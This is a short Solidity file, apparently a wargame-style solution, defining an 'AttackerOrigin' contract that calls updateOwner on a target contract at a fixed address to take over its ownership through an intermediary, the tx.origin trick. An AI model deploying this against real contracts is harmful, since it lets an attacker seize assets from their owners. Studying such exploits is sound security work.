// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./UnknownOrigin.sol";

contract AttackerOrigin {
    UnknownOrigin public unknownOrig = UnknownOrigin(0xF387B9F6C4EB0735d18c9def34Ba6b21593E74aE);

    function attackOwner(address _owner) public {
        unknownOrig.updateOwner(_owner);
    }

}